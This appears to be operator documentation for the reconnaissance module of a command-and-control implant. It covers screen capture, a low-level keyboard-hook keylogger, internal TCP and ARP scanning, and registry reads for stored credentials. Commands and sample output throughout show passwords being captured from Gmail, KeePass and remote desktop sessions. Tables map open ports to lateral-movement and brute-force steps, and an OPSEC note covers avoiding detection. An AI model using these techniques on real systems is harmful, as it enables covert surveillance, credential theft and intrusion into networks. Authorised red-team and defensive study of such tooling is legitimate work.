# Reconnaissance

Capture screenshots, log keystrokes, and scan the network — all through the encrypted beacon channel.

---

## Screenshot

Capture the target's primary display and receive it as a base64-encoded BMP file.

```
❯ screenshot a1b2
[*] Capturing screenshot from agent a1b2c3d4...
[+] Screenshot captured.

[base64 BMP data printed to terminal]

# Save directly to a local file
❯ screenshot a1b2 --save /loot/screen_20260425_142301.bmp
[+] Screenshot saved to /loot/screen_20260425_142301.bmp
```

**How it works:**
1. Agent calls `GetDC(NULL)` — gets DC for the entire screen
2. Creates a compatible DC and bitmap (`CreateCompatibleDC`, `CreateCompatibleBitmap`)
3. `BitBlt(SRCCOPY)` — copies screen pixels into the bitmap
4. `GetDIBits` — retrieves raw 24-bit BGR pixel data
5. Assembles BMP file header + DIB header + pixel data in memory
6. Base64-encodes the BMP and submits as command result

**Why use it:**
- Verify that the agent is running in an interactive desktop session (vs. a service context with no visible desktop)
- Identify what the user is currently working on (open applications, visible documents, credentials on screen)
- Confirm the right machine before running aggressive operations
- Monitor for password manager windows or authentication dialogs

**Use case:** Before running a LSASS dump, take a screenshot to verify the machine is actively used, a user is logged in, and there are actual credentials worth dumping.

---

## Keylogger

Record keystrokes in a memory buffer. The buffer accumulates input silently and is retrieved on demand.

### Start Keylogger

```
❯ keylog start a1b2
[*] Starting keylogger on agent a1b2c3d4...
[+] Keylogger started.

# Start and auto-stop after 60 seconds
❯ keylog start a1b2 --duration 60
```

**How it works:** Installs a keyboard hook via `SetWindowsHookEx(WH_KEYBOARD_LL)` in the agent process. All keystrokes (including from other windows) are intercepted and buffered in memory.

### Retrieve Keystrokes

```
❯ keylog dump a1b2
[*] Retrieving keylog buffer from agent a1b2c3d4...
[+] Keylog buffer:

[2026-04-25 14:15:02] [window: Google Chrome - gmail.com]
jsmith@corp.local

[2026-04-25 14:15:08] [window: Google Chrome - gmail.com]
Summer2024!
[ENTER]

[2026-04-25 14:22:30] [window: KeePass 2.x - keepass]
MasterPassphrase!

[2026-04-25 14:23:11] [window: Remote Desktop Connection]
\\FILESERVER-02
corp\administrator
CorpAdmin2024!
```

The keylog buffer includes:
- Timestamp of each keystroke sequence
- Window title (showing what application received the input)
- The actual keystrokes with special keys labeled (`[ENTER]`, `[BACKSPACE]`, `[TAB]`, `[Ctrl+C]`, etc.)

### Stop Keylogger

```
❯ keylog stop a1b2
[*] Stopping keylogger on agent a1b2c3d4...
[+] Keylogger stopped. Final buffer:
[... final keystrokes ...]
```

### Clear Buffer

```
❯ keylog clear a1b2
[+] Keylog buffer cleared.
```

**Use case workflow:**
1. `keylog start a1b2` — install and let it run during business hours
2. `keylog dump a1b2` — retrieve periodically (every few hours)
3. `keylog stop a1b2` — clean up at the end of the engagement
4. `keylog clear a1b2` — discard buffer if it contains irrelevant data

**OPSEC note:** `SetWindowsHookEx(WH_KEYBOARD_LL)` is a documented and commonly used API that can be detected by security products watching for unexpected hook installations. On a monitored target, consider whether a keylogger is worth the detection risk versus simply using credential access techniques.

---

## Network Scan (TCP)

Scan a CIDR range or single host for open TCP ports, using the agent as the scanner. This is useful for internal network enumeration when the operator machine has no direct access to the target network.

```
# Scan common ports across a subnet
❯ netscan a1b2 -t 10.0.0.0/24 -p 22,80,443,445,3389,5985
[*] Starting network scan from agent a1b2c3d4...
[+] Scan complete. Results:

10.0.0.1   :80   open   [HTTP]
10.0.0.1   :443  open   [HTTPS]
10.0.0.10  :445  open   [SMB]
10.0.0.10  :3389 open   [RDP]
10.0.0.11  :22   open   [SSH]
10.0.0.15  :5985 open   [WinRM]
10.0.0.20  :445  open   [SMB]
10.0.0.20  :3389 open   [RDP]

# Scan single host with service banner grabbing
❯ netscan a1b2 -t 10.0.0.10 --banners --wait
[+] Results:
10.0.0.10 :445  open  SMB2/3 (Windows Server 2019)
10.0.0.10 :3389 open  RDP (Microsoft Terminal Services)
10.0.0.10 :5985 open  HTTP/1.1 (WinRM WSMAN)
```

**What the output tells you:**

| Port | Service | Next Action |
|------|---------|------------|
| 445 | SMB | Check shares, PsExec, Pass-the-Hash |
| 3389 | RDP | Remote desktop, brute force |
| 5985/5986 | WinRM | `lateral winrm` command |
| 22 | SSH | Credential attack, key theft |
| 8080/8443 | Web app | Browser or curl-based recon |
| 1433 | MSSQL | SQL credentials, xp_cmdshell |

**Use case:** After gaining initial access on a workstation, use the agent as a scanner to map the internal network — finding DCs, file servers, and lateral movement targets that are not visible from outside.

---

## ARP Scan

Discover all live hosts on the local subnet using ARP broadcasts.

```
❯ arpscan a1b2 --wait
[*] Starting ARP scan from agent a1b2c3d4...
[+] ARP scan complete.

IP              MAC               Vendor
10.0.0.1        00:50:56:xx:xx:xx VMware
10.0.0.10       00:0c:29:xx:xx:xx VMware (Windows Server)
10.0.0.11       00:0c:29:xx:xx:xx VMware (Linux)
10.0.0.15       00:1a:2b:xx:xx:xx Cisco
10.0.0.20       00:0c:29:xx:xx:xx VMware (Windows)
10.0.0.100      00:50:56:xx:xx:xx VMware
```

**Why use ARP instead of TCP scan:**
- ARP works even on hosts with firewalls that block all TCP (they still respond to ARP because it's Layer 2)
- Faster than TCP scanning — no connection timeouts
- Reveals every host on the local segment, including network equipment

**Limitation:** ARP only works within the same Layer 2 segment (subnet). For cross-subnet discovery, use TCP scan with CIDR targeting.

---

## Registry Enumeration

Read and enumerate Windows registry keys for sensitive configuration and credentials.

```
# List available VPN configurations
❯ registry list a1b2 HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\NetworkList\Profiles

# Read a specific value
❯ registry read a1b2 HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion -V ProductName
[+] Value: Windows 10 Enterprise

# Find AutoLogon credentials (often set in kiosks / service accounts)
❯ registry read a1b2 HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon -V DefaultUserName
❯ registry read a1b2 HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon -V DefaultPassword
❯ registry read a1b2 HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon -V AutoAdminLogon
```

**High-value registry locations:**

| Key | What You Find |
|-----|--------------|
| `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon` | AutoLogon credentials |
| `HKLM\SYSTEM\CurrentControlSet\Services` | Service executables and configs |
| `HKCU\Software\Microsoft\Windows\CurrentVersion\Run` | User autorun entries |
| `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall` | Installed software |
| `HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest` | WDigest config (can enable cleartext creds) |
| `HKCU\Software\SimonTatham\PuTTY\Sessions` | PuTTY saved sessions with credentials |
| `HKCU\Software\Microsoft\Terminal Server Client\Servers` | Recent RDP connections |
